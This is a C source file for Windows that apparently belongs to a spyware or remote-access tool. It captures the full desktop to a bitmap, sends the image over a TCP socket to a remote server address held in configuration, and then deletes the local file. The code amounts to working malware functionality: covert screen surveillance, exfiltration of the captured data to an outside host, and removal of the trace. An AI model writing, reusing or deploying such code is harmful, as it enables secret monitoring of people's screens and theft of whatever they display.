#include "Variables.h"

int TakeScreenshot(const char *OutName)
{
	HWND DesktopWind = GetDesktopWindow();
	HDC TotalScreenDC = GetDC(NULL);

	if (TotalScreenDC == NULL)
	{
		return EXIT_FAILURE;
	}

	HDC MemoryDC = CreateCompatibleDC(TotalScreenDC);

	if (MemoryDC == NULL)
	{
		return EXIT_FAILURE;
	}

	int Width = GetDeviceCaps(TotalScreenDC, HORZRES);
	int Height = GetDeviceCaps(TotalScreenDC, VERTRES);

	HBITMAP Bitmap = CreateCompatibleBitmap(TotalScreenDC, Width, Height);

	if (Bitmap == NULL)
	{
		return EXIT_FAILURE;
	}

	SelectObject(MemoryDC, Bitmap);

	if (BitBlt(MemoryDC, 0, 0, Width, Height, TotalScreenDC, 0, 0, CAPTUREBLT | SRCCOPY) == 0)
	{
		return EXIT_FAILURE;
	}

	BITMAPFILEHEADER fileHeader;
	BITMAPINFOHEADER infoHeader;
	BITMAP bmp;
	DWORD BmpSize;
	HANDLE DIB;
	DWORD BytesWritten;
	HANDLE OutImageFile;

	GetObject(Bitmap, sizeof(BITMAP), &bmp);

	infoHeader.biSize = sizeof(BITMAPINFOHEADER);
	infoHeader.biWidth = bmp.bmWidth;
	infoHeader.biHeight = bmp.bmHeight;
	infoHeader.biPlanes = 1;
	infoHeader.biBitCount = 32;
	infoHeader.biCompression = BI_RGB;
	infoHeader.biSizeImage = 0;
	infoHeader.biXPelsPerMeter = 0;
	infoHeader.biYPelsPerMeter = 0;
	infoHeader.biClrUsed = 0;
	infoHeader.biClrImportant = 0;

	BmpSize = ((bmp.bmWidth * infoHeader.biBitCount + 31) / 32) * 4 * bmp.bmHeight;

	DIB = GlobalAlloc(GHND, BmpSize);
	char* lpbitmap = (char*)GlobalLock(DIB);

	GetDIBits(MemoryDC, Bitmap, 0, (UINT)bmp.bmHeight, lpbitmap, (BITMAPINFO*)&infoHeader, DIB_RGB_COLORS);

	OutImageFile = CreateFileA(OutName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

	fileHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
	fileHeader.bfSize = BmpSize + sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
	fileHeader.bfType = 0x4D42;

	WriteFile(OutImageFile, (LPSTR)&fileHeader, sizeof(BITMAPFILEHEADER), &BytesWritten, NULL);
	WriteFile(OutImageFile, (LPSTR)&infoHeader, sizeof(BITMAPINFOHEADER), &BytesWritten, NULL);
	WriteFile(OutImageFile, (LPSTR)lpbitmap, BmpSize, &BytesWritten, NULL);

	GlobalUnlock(DIB);
	GlobalFree(DIB);
	CloseHandle(OutImageFile);
	DeleteObject(Bitmap);
	DeleteDC(MemoryDC);
	ReleaseDC(DesktopWind, TotalScreenDC);

	TransferFilesToServer(FullFileName);

	DeleteFile(FullFileName);

	return EXIT_SUCCESS;
}

void TransferFilesToServer(const char *FileToTransfer)
{
	WSADATA wsaDataTransfer;
	SOCKET filesock;
	char SendBuff[1024];
	char FileName[256];

	strcpy(FileName, FileToTransfer);

	filesock = socket(AF_INET, SOCK_STREAM, 0);
	if (filesock == INVALID_SOCKET)
	{
		return;
	}

	memset(&FileServerAddress, 0, sizeof(FileServerAddress));
	FileServerAddress.sin_family = AF_INET;
	FileServerAddress.sin_addr.s_addr = inet_addr(ServerIP);
	FileServerAddress.sin_port = htons(ServerTransferPort);

	if (connect(filesock, (struct sockaddr*)&FileServerAddress, sizeof(FileServerAddress)) < 0)
	{
		closesocket(filesock);
		return;
	}

	FILE *fp = fopen(FileName, "rb");
	if (fp == NULL)
	{
		closesocket(filesock);
		return;
	}

	send(filesock, FileName, sizeof(FileName), 0);

	int BytesRead;
	while ((BytesRead = fread(SendBuff, 1, sizeof(SendBuff), fp)) > 0)
	{
		if (send(filesock, SendBuff, BytesRead, 0) == SOCKET_ERROR)
		{
			fclose(fp);
			closesocket(filesock);
			return;
		}
	}

	fclose(fp);
	closesocket(filesock);
}
